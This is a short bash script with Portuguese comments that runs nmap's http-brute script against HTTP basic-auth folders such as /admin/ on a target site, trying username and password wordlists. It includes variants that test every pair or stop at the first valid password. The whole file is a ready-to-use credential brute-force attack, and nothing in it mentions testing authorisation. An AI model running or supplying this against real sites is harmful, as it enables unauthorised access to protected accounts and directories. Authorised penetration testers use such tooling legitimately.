#! /bin/bash
#Autor: Joao Nossol
#github: https://github.com/joaonossolb
#Brute Force http-auth(São aquelas pastas que pedem senha para testar, onde o campo de preenchimento aparece com janela em javascript)

#nmap -p<PORTA DESTINO> --script http-brute --script-args http-user.path=/PASTA EM QUE ESTÁ A APLICAÇÃO/, userdb=wordlistUsuario.txt, passdb=wordlistSenhas.txt <TARGET> -d
#TARGET --> Alvo EX: www.site.com

#Testa TODOS os usuarios e senhas
#nmap -p80 --script http-brute --script-args http-user.path=/admin/, userdb=wordlistUsuarios.txt, passdb=wordlistSenhas.txt <TARGET> -d

#Se encontrar a primeira senha, já para o brute force
nmap -p80 --script http-brute --script-args userdb=wordlistUsuarios.txt, passdb=wordlistSenhas.txt, brute.firstOnly <TARGET> -d
